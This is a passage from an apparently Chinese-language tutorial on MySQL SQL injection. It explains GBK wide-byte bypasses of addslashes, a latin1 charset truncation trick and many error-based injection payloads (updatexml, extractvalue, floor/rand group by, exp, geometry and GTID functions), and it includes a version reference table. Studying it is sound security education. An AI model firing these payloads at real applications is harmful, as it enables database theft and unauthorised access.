    echo &quot;fail&quot;;
}
?&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;还是开头的例子，只不过加了点料。&lt;/p&gt;
&lt;pre class=&quot;php&quot;&gt;
&lt;code&gt;$conn-&amp;gt;query(&quot;set names 'gbk';&quot;);
$username = addslashes(@$_POST['username']);
$password = addslashes(@$_POST['password']);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;addslashes&lt;/code&gt;函数将会把POST接收到的username与password的部分字符进行转义处理。如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;字符&lt;code&gt;'、&quot;、\&lt;/code&gt;前边会被添加上一条反斜杠&lt;code&gt;\&lt;/code&gt;作为转义字符。&lt;/li&gt;
&lt;li&gt;多个空格被过滤成一个空格。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;这使得我们原本的payload被转义成如下：&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;select * from users where username = 'admin\'#' and password='123';&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;注意：我们输入的单引号被转义掉了，此时SQL语句的功能是：查找用户名为&lt;code&gt;admin'#&lt;/code&gt;且密码为123的用户。&lt;/p&gt;
&lt;p&gt;但是我们注意到，在拼接SQL语句并与数据库进行通信之前，我们执行了这么一条语句：&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;$conn-&amp;gt;query(&quot;set names 'gbk';&quot;);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其作用相当于：&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;mysql&amp;gt;SET character_set_client ='gbk';
mysql&amp;gt;SET character_set_results ='gbk';
mysql&amp;gt;SET character_set_connection ='gbk';&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当我们输入的数据为：&lt;code&gt;username=%df%27or%201=1%23&amp;amp;password=123&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;经过addslashes函数处理最终变成：&lt;code&gt;username=%df%5c%27or%201=1%23&amp;amp;password=123&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;经过gbk解码得到：&lt;code&gt;username=運'or 1=1#&lt;/code&gt;、&lt;code&gt;password=123&lt;/code&gt;，拼接到SQL语句得：&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;select * from users where username = '運'or 1=1#' and password='123';&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;成功跳出了addslashes的转义限制。&lt;/p&gt;
&lt;h4 id=&quot;具体解释&quot;&gt;具体解释&lt;/h4&gt;
&lt;p&gt;前边提到：&lt;code&gt;set names 'gbk';&lt;/code&gt;相当于执行了如下操作：&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;mysql&amp;gt;SET character_set_client ='gbk';
mysql&amp;gt;SET character_set_results ='gbk';
mysql&amp;gt;SET character_set_connection ='gbk';&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;那么此时在SQL语句在与数据库进行通信时，会先将SQL语句进行对应的&lt;code&gt;character_set_client&lt;/code&gt;所设置的编码进行转码，本例是gbk编码。&lt;/p&gt;
&lt;p&gt;由于PHP的编码为&lt;code&gt;UTF-8&lt;/code&gt;，我们输入的内容为&lt;code&gt;%df%27&lt;/code&gt;，会被当做是两个字符，其中&lt;code&gt;%27&lt;/code&gt;为单引号&lt;code&gt;'&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;经过函数&lt;code&gt;addslashes&lt;/code&gt;处理变成&lt;code&gt;%df%5c%27&lt;/code&gt;，&lt;code&gt;%5c&lt;/code&gt;为反斜线&lt;code&gt;\&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;在经过客户端层&lt;code&gt;character_set_client&lt;/code&gt;编码处理后变成：&lt;code&gt;運'&lt;/code&gt;，成功将反斜线给“吞”掉了，使单引号逃逸出来。&lt;/p&gt;
&lt;h3 id=&quot;latin1默认编码&quot;&gt;Latin1默认编码&lt;/h3&gt;
&lt;p&gt;讲完了gbk造成的编码问题，我们再讲讲latin1造成的编码问题。&lt;/p&gt;
&lt;p&gt;老样子，先举个例子。&lt;/p&gt;
&lt;pre class=&quot;php&quot;&gt;
&lt;code&gt;&amp;lt;?php
//该代码节选自：离别歌's blog
$mysqli = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;cat&quot;);

/* check connection */
if ($mysqli-&amp;gt;connect_errno) {
    printf(&quot;Connect failed: %s\n&quot;, $mysqli-&amp;gt;connect_error);
    exit();
}

$mysqli-&amp;gt;query(&quot;set names utf8&quot;);

$username = addslashes($_GET['username']);

//我们在其基础上添加这么一条语句。
if($username === 'admin'){
    die(&quot;You can't do this.&quot;);
}

/* Select queries return a resultset */
$sql = &quot;SELECT * FROM `table1` WHERE username='{$username}'&quot;;

if ($result = $mysqli-&amp;gt;query( $sql )) {
    printf(&quot;Select returned %d rows.\n&quot;, $result-&amp;gt;num_rows);

    while ($row = $result-&amp;gt;fetch_array(MYSQLI_ASSOC))
    {
        var_dump($row);
    }

    /* free result set */
    $result-&amp;gt;close();
} else {
    var_dump($mysqli-&amp;gt;error);
}

$mysqli-&amp;gt;close();
?&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;建表语句如下：&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;CREATE TABLE `table1` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(255) COLLATE latin1_general_ci NOT NULL,
  `password` varchar(255) COLLATE latin1_general_ci NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们设置表的编码为latin1，事实上，就算你不填写，默认编码便是latin1。&lt;/p&gt;
&lt;p&gt;我们往表中添加一条数据：&lt;code&gt;insert table1 VALUES(1,'admin','admin');&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;注意查看源代码：&lt;/p&gt;
&lt;pre class=&quot;php&quot;&gt;
&lt;code&gt;if($username === 'admin'){
    die(&quot;You can't do this.&quot;);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们对用户的输入进行了判断，若输入内容为admin，直接结束代码输出返回，并且还对输出的内容进行addslashes处理，使得我们无法逃逸出单引号。&lt;/p&gt;
&lt;p&gt;这样的话，我们该怎样绕过这个限制，让页面输出admin的数据呢？&lt;/p&gt;
&lt;p&gt;我们注意到：&lt;code&gt;$mysqli-&amp;gt;query(&quot;set names utf8&quot;);&lt;/code&gt;这么一行代码，在连接到数据库之后，执行了这么一条SQL语句。&lt;/p&gt;
&lt;p&gt;上边在gbk宽字节注入的时候讲到过：&lt;code&gt;set names utf8;&lt;/code&gt;相当于：&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;mysql&amp;gt;SET character_set_client ='utf8';
mysql&amp;gt;SET character_set_results ='utf8';
mysql&amp;gt;SET character_set_connection ='utf8';&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;前边说道：PHP的编码是&lt;code&gt;UTF-8&lt;/code&gt;，而我们现在设置的也是&lt;code&gt;UTF-8&lt;/code&gt;，怎么会产生问题呢？&lt;/p&gt;
&lt;p&gt;别着急，让我接着往下说。前边我们提到：SQL语句会先转成&lt;code&gt;character_set_client&lt;/code&gt;设置的编码。但，他接下来还会继续转换。&lt;code&gt;character_set_client&lt;/code&gt;客户端层转换完毕之后，数据将会交给&lt;code&gt;character_set_connection&lt;/code&gt;连接层处理，最后在从&lt;code&gt;character_set_connection&lt;/code&gt;转到数据表的内部操作字符集。&lt;/p&gt;
&lt;p&gt;来本例中，字符集的转换为：&lt;code&gt;UTF-8—&amp;gt;UTF-8-&amp;gt;Latin1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这里需要讲一下UTF-8编码的一些内容。&lt;/p&gt;
&lt;blockquote readability=&quot;13.239700374532&quot;&gt;
&lt;p&gt;UTF-8编码是变长编码，可能有1~4个字节表示：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;一字节时范围是&lt;code&gt;[00-7F]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;两字节时范围是&lt;code&gt;[C0-DF][80-BF]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;三字节时范围是&lt;code&gt;[E0-EF][80-BF][80-BF]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;四字节时范围是&lt;code&gt;[F0-F7][80-BF][80-BF][80-BF]&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;然后根据RFC 3629规范，又有一些字节值是不允许出现在UTF-8编码中的：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1095571/202002/1095571-20200221065942207-1741021074.jpg&quot; alt=&quot;UTF8编码&quot;/&gt;&lt;/p&gt;
&lt;p&gt;所以最终，UTF-8第一字节的取值范围是：00-7F、C2-F4。&lt;/p&gt;
&lt;p&gt;关于所有的UTF-8字符，你可以在这个表中一一看到： http://utf8-chartable.de/unicode-utf8-table.pl&lt;/p&gt;
&lt;p&gt;引自：&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html&quot;&gt;Mysql字符编码利用技巧&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;利用这一特性，我们输入：&lt;code&gt;?username=admin%c2&lt;/code&gt;，&lt;code&gt;%c2&lt;/code&gt;是一个Latin1字符集不存在的字符。&lt;/p&gt;
&lt;p&gt;由上述，可以简单的知道：%00-%7F可以直接表示某个字符、%C2-%F4不可以直接表示某个字符，他们只是其他长字节编码结果的首字节。&lt;/p&gt;
&lt;p&gt;但是，这里还有一个Trick：Mysql所使用的UTF-8编码是阉割版的，仅支持三个字节的编码。所以说，Mysql中的UTF-8字符集只有最大三字节的字符，首字节范围：&lt;code&gt;00-7F、C2-EF&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;而对于不完整的长字节UTF-8编码的字符，若进行字符集转换时，会直接进行忽略处理。&lt;/p&gt;
&lt;p&gt;利用这一特性，我们的payload为&lt;code&gt;?username=admin%c2&lt;/code&gt;，此处的&lt;code&gt;%c2&lt;/code&gt;换为&lt;code&gt;%c2-%ef&lt;/code&gt;均可。&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;SELECT * FROM `table1` WHERE username='admin'&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;因为&lt;code&gt;admin%c2&lt;/code&gt;在最后一层的内部操作字符集转换中变成&lt;code&gt;admin&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&quot;报错注入原理&quot;&gt;报错注入原理&lt;/h2&gt;
&lt;p&gt;我们前边说到，报错注入是通过特殊函数错误使用并使其输出错误结果来获取信息的。&lt;/p&gt;
&lt;p&gt;那么，我们具体来说说，都有哪些特殊函数，以及他们都该怎么使用。&lt;/p&gt;
&lt;p&gt;MySQL的报错注入主要是利用MySQL的一些逻辑漏洞，如BigInt大数溢出等，由此可以将MySQL报错注入分为以下几类：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;BigInt等数据类型溢出&lt;/li&gt;
&lt;li&gt;函数参数格式错误&lt;/li&gt;
&lt;li&gt;主键/字段重复&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;exp&quot;&gt;exp()&lt;/h3&gt;
&lt;p&gt;函数语法：&lt;code&gt;exp(int)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;适用版本：5.5.5~5.5.49&lt;/p&gt;
&lt;p&gt;该函数将会返回e的x次方结果。正常如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1095571/202002/1095571-20200221070016813-1343634482.png&quot; alt=&quot;exp函数正常执行&quot;/&gt;&lt;/p&gt;
&lt;p&gt;为什么会报错呢？我们知道，次方到后边每增加1，其结果都将跨度极大，而mysql能记录的double数值范围有限，一旦结果超过范围，则该函数报错。如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1095571/202002/1095571-20200221070036317-934000206.png&quot; alt=&quot;exp错误执行&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们的payload为：&lt;code&gt;exp(~(select * from(select user())a))&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;其中，~符号为运算符，意思为一元字符反转，通常将字符串经过处理后变成大整数，再放到exp函数内，得到的结果将超过mysql的double数组范围，从而报错输出。至于为什么需要用两层子查询，这点我暂时还没有弄明白，欢迎有了解的大牛找我讨论: )&lt;/p&gt;
&lt;p&gt;除了&lt;code&gt;exp()&lt;/code&gt;之外，还有类似&lt;code&gt;pow()&lt;/code&gt;之类的相似函数同样是可利用的，他们的原理相同。&lt;/p&gt;
&lt;h3 id=&quot;updatexml&quot;&gt;updatexml()&lt;/h3&gt;
&lt;p&gt;函数语法：&lt;code&gt;updatexml(XML_document, XPath_string, new_value);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;适用版本: 5.1.5+&lt;/p&gt;
&lt;p&gt;我们通常在第二个xpath参数填写我们要查询的内容。&lt;/p&gt;
&lt;p&gt;与exp()不同，updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数的信息。&lt;/p&gt;
&lt;p&gt;payload: &lt;code&gt;updatexml(1,concat(0x7e,(select user()),0x7e),1)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;前后添加~使其不符合xpath格式从而报错。&lt;/p&gt;

&lt;p&gt;函数语法：&lt;code&gt;EXTRACTVALUE (XML_document, XPath_string);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;适用版本：5.1.5+&lt;/p&gt;
&lt;p&gt;利用原理与updatexml函数相同&lt;/p&gt;
&lt;p&gt;payload: &lt;code&gt;and (extractvalue(1,concat(0x7e,(select user()),0x7e)))&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;randgroupcount&quot;&gt;rand()+group()+count()&lt;/h3&gt;
&lt;p&gt;虚拟表报错原理：简单来说，是由于where条件每执行一次，rand函数就会执行一次，如果在由于在统计数据时判断依据不能动态改变，故&lt;code&gt;rand()&lt;/code&gt;不能后接在&lt;code&gt;order/group by&lt;/code&gt;上。&lt;/p&gt;
&lt;p&gt;举一个例子：假设user表有三条数据，我们通过：&lt;code&gt;select * from user group by username&lt;/code&gt; 来通过其中的username字段进行分组。&lt;/p&gt;
&lt;p&gt;此过程会先建立一个&lt;strong&gt;虚拟表&lt;/strong&gt;，存在两个字段：&lt;code&gt;key，count&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;其中我们通过username来判断，其在此处是字段，首先先取第一行的数据：&lt;code&gt;username=test&amp;amp;password=test&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;username为test出现一次，则现在虚表内查询是否存在test，若存在，则count+1，若不存在，则添加test，其count为1。&lt;/p&gt;
&lt;p&gt;对于&lt;code&gt;floor(rand(0)*2)&lt;/code&gt;，其中&lt;code&gt;rand()&lt;/code&gt;函数，会生成0~1之间随机一个小数、&lt;code&gt;floor()&lt;/code&gt;取整数部分、0是随机因子、乘2是为了让大于0.5的小数通过floor函数得1，否则永远为0。&lt;/p&gt;
&lt;p&gt;若表中有三行数据：我们通过&lt;code&gt;select * from user group by floor(rand(0)*2)&lt;/code&gt;进行排序的话。&lt;/p&gt;
&lt;p&gt;注意，由于&lt;code&gt;rand(0)&lt;/code&gt;的随机因子是被固定的，故其产生的随机数也被固定了，顺序为：011011…&lt;/p&gt;
&lt;p&gt;首先&lt;code&gt;group by&lt;/code&gt;需要执行的话，需要确定分组因子，故&lt;code&gt;floor(rand(0)*2)&lt;/code&gt;被执行一次，得到的结果为0，接着在虚表内检索0，发现虚表没有键值为0的记录，故添加上，在进行添加时：&lt;code&gt;floor(rand(0)*2)&lt;/code&gt;第二次被执行，得到结果1，故虚表插入的内容为&lt;code&gt;key=1&amp;amp;count=1&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;第二次执行group by时：&lt;code&gt;floor(rand(0)*2)&lt;/code&gt;先被运行一次，也就是第三次运行。得到结果1，查询虚表发现数据存在，因而直接让虚表内的key=1的count加一即可，floor(..)只运行了一次。&lt;/p&gt;
&lt;p&gt;第三次执行group by时，floor被执行第四次，得到结果0，查询虚表不存在。再插入虚表时，floor(…)被执行第五次，得到结果1，故此时虚表将插入的值为&lt;code&gt;key=1&amp;amp;count=1&lt;/code&gt;，注意，此时虚表已有一条记录为：&lt;code&gt;key=1&amp;amp;count=2&lt;/code&gt;，并且字段key为&lt;strong&gt;主键&lt;/strong&gt;，具有不可重复性，故虚表在尝试插入时将产生错误。&lt;/p&gt;
&lt;p&gt;图文：&lt;/p&gt;
&lt;blockquote readability=&quot;22.863673469388&quot;&gt;
&lt;p&gt;1.查询前默认会建立空虚拟表如下图:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1095571/202002/1095571-20200221070104523-1019706839.jpg&quot; alt=&quot;空的虚拟表&quot;/&gt;&lt;/p&gt;
&lt;p&gt;2.取第一条记录，执行floor(rand(0)&lt;em&gt;2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)&lt;/em&gt;2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕，如下图:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1095571/202002/1095571-20200221070119198-1940308075.jpg&quot; alt=&quot;第一次计算&quot;/&gt;&lt;/p&gt;
&lt;p&gt;\3.查询第二条记录，再次计算floor(rand(0)&lt;em&gt;2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以floor(rand(0)&lt;/em&gt;2)不会被计算第二次，直接count(*)加1，第二条记录查询完毕，结果如下:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1095571/202002/1095571-20200221070137652-2136876708.jpg&quot; alt=&quot;第二次计算&quot;/&gt;&lt;/p&gt;
&lt;p&gt;4.查询第三条记录，再次计算floor(rand(0)&lt;em&gt;2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)&lt;/em&gt;2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了。&lt;/p&gt;
&lt;p&gt;5.整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。&lt;/p&gt;
&lt;p&gt;引自：——&lt;a href=&quot;http://drops.wooyun.org/tips/14312&quot;&gt;Mysql报错注入原理分析(count()、rand()、group by)&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;payload用法: &lt;code&gt;union select count(*),2,concat(':',(select database()),':',floor(rand()*2))as a from information_schema.tables group by a&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;几何函数&quot;&gt;几何函数&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;GeometryCollection：&lt;code&gt;id=1 AND GeometryCollection((select * from (select* from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;polygon()：&lt;code&gt;id=1 AND polygon((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;multipoint()：&lt;code&gt;id=1 AND multipoint((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;multilinestring()：&lt;code&gt;id=1 AND multilinestring((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;linestring()：&lt;code&gt;id=1 AND LINESTRING((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;multipolygon() ：&lt;code&gt;id=1 AND multipolygon((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;不存在的函数&quot;&gt;不存在的函数&lt;/h3&gt;
&lt;p&gt;随便适用一颗不存在的函数，可能会得到当前所在的数据库名称。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1095571/202002/1095571-20200221070203995-740835392.png&quot; alt=&quot;不存在的函数报错&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;bigint数值操作&quot;&gt;Bigint数值操作：&lt;/h3&gt;
&lt;p&gt;当mysql数据库的某些边界数值进行数值运算时，会报错的原理。&lt;/p&gt;
&lt;p&gt;如~0得到的结果：18446744073709551615&lt;/p&gt;
&lt;p&gt;若此数参与运算，则很容易会错误。&lt;/p&gt;
&lt;p&gt;payload: &lt;code&gt;select !(select * from(select user())a)-~0;&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;name_const&quot;&gt;name_const()&lt;/h3&gt;
&lt;p&gt;仅可取数据库版本信息&lt;/p&gt;
&lt;p&gt;payload: &lt;code&gt;select * from(select name_const(version(),0x1),name_const(version(),0x1))a&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;uuid相关函数&quot;&gt;uuid相关函数&lt;/h3&gt;
&lt;p&gt;适用版本：8.0.x&lt;/p&gt;
&lt;p&gt;参数格式不正确。&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;mysql&amp;gt; SELECT UUID_TO_BIN((SELECT password FROM users WHERE id=1));
mysql&amp;gt; SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1));&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;join-using注列名&quot;&gt;join using()注列名&lt;/h3&gt;
&lt;p&gt;通过系统关键词join可建立两个表之间的内连接。&lt;/p&gt;
&lt;p&gt;通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因(相同列名存在)，而发生错误。&lt;/p&gt;
&lt;p&gt;并且报错信息会存在重复的列名，可以使用 &lt;strong&gt;USING&lt;/strong&gt; 表达式声明内连接（INNER JOIN）条件来避免报错。&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;mysql&amp;gt;select * from(select * from users a join (select * from users)b)c;
mysql&amp;gt;select * from(select * from users a join (select * from users)b using(username))c;
mysql&amp;gt;select * from(select * from users a join (select * from users)b using(username,password))c&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;gtid相关函数&quot;&gt;GTID相关函数&lt;/h3&gt;
&lt;p&gt;参数格式不正确。&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;mysql&amp;gt;select gtid_subset(user(),1);
mysql&amp;gt;select gtid_subset(hex(substr((select * from users limit 1,1),1,1)),1);
mysql&amp;gt;select gtid_subtract((select * from(select user())a),1);&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;报错函数速查表&quot;&gt;报错函数速查表&lt;/h3&gt;
&lt;p&gt;注：默认MYSQL_ERRMSG_SIZE=512&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;3&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;主键重复&lt;/td&gt;
&lt;td&gt;floor round&lt;/td&gt;
&lt;td&gt;❓&lt;/td&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td/&gt;
&lt;td&gt;64&lt;/td&gt;
&lt;td/&gt;
&lt;td&gt;data_type ≠ varchar&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;列名重复&lt;/td&gt;
&lt;td&gt;name_const&lt;/td&gt;
&lt;td&gt;❓&lt;/td&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td/&gt;
&lt;td/&gt;
&lt;td&gt;only version()&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;列名重复&lt;/td&gt;
&lt;td&gt;join&lt;/td&gt;
&lt;td&gt;[5.5.49, ?)&lt;/td&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td/&gt;
&lt;td/&gt;
&lt;td&gt;only columns&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;数据溢出 - Double&lt;/td&gt;
&lt;td&gt;1e308 cot exp pow&lt;/td&gt;
&lt;td&gt;[5.5.5, 5.5.48]&lt;/td&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td/&gt;
&lt;td/&gt;
&lt;td/&gt;
&lt;td/&gt;
&lt;td&gt;MYSQL_ERRMSG_SIZE&lt;/td&gt;
&lt;td/&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;数据溢出 - BIGINT&lt;/td&gt;
&lt;td&gt;1+~0&lt;/td&gt;
&lt;td&gt;[5.5.5, 5.5.48]&lt;/td&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td/&gt;
&lt;td/&gt;
&lt;td/&gt;
&lt;td/&gt;
&lt;td&gt;MYSQL_ERRMSG_SIZE&lt;/td&gt;
&lt;td/&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;几何对象&lt;/td&gt;
&lt;td&gt;geometrycollection linestring multipoint multipolygon multilinestring polygon&lt;/td&gt;
&lt;td&gt;[?, 5.5.48]&lt;/td&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td/&gt;
&lt;td/&gt;
&lt;td/&gt;
&lt;td/&gt;
&lt;td&gt;244&lt;/td&gt;
&lt;td/&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;空间函数 Geohash&lt;/td&gt;
&lt;td&gt;ST_LatFromGeoHash ST_LongFromGeoHash ST_PointFromGeoHash&lt;/td&gt;
&lt;td&gt;[5.7, ?)&lt;/td&gt;
&lt;td/&gt;
&lt;td/&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td&gt;128&lt;/td&gt;
&lt;td/&gt;
&lt;td/&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;GTID&lt;/td&gt;
&lt;td&gt;gtid_subset gtid_subtract&lt;/td&gt;
&lt;td&gt;[5.6.5, ?)&lt;/td&gt;
&lt;td/&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td/&gt;
&lt;td/&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;JSON&lt;/td&gt;
&lt;td&gt;json_*&lt;/td&gt;
&lt;td&gt;[5.7.8, 5.7.11]&lt;/td&gt;
&lt;td/&gt;
&lt;td/&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td/&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td/&gt;
&lt;td/&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;UUID&lt;/td&gt;
&lt;td&gt;uuid_to_bin bin_to_uuid&lt;/td&gt;
&lt;td&gt;[8.0, ?)&lt;/td&gt;
&lt;td/&gt;
&lt;td/&gt;
&lt;td/&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td&gt;128&lt;/td&gt;
&lt;td/&gt;
&lt;td/&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;XPath&lt;/td&gt;
&lt;td&gt;extractvalue updatexml&lt;/td&gt;
&lt;td&gt;[5.1.5, ?)&lt;/td&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td&gt;✔️&lt;/td&gt;
&lt;td&gt;32&lt;/td&gt;
&lt;td/&gt;
&lt;td/&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;blockquote readability=&quot;1.6666666666667&quot;&gt;
&lt;p&gt;摘自——&lt;a href=&quot;https://blog.sari3l.com/posts/9622f295/&quot;&gt;Mysql 注入基础小结&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;文件读写&quot;&gt;文件读/写&lt;/h2&gt;
&lt;p&gt;我们知道Mysql是很灵活的，它支持文件读/写功能。在讲这之前，有必要介绍下什么是&lt;code&gt;file_priv&lt;/code&gt;和&lt;code&gt;secure-file-priv&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;简单的说：&lt;code&gt;file_priv&lt;/code&gt;是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下述payload查询权限。&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;select file_priv from mysql.user where user=$USER host=$HOST;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;secure-file-priv&lt;/code&gt;是一个系统变量，对于文件读/写功能进行限制。具体如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;无内容，表示无限制。&lt;/li&gt;
&lt;li&gt;为NULL，表示禁止文件读/写。&lt;/li&gt;
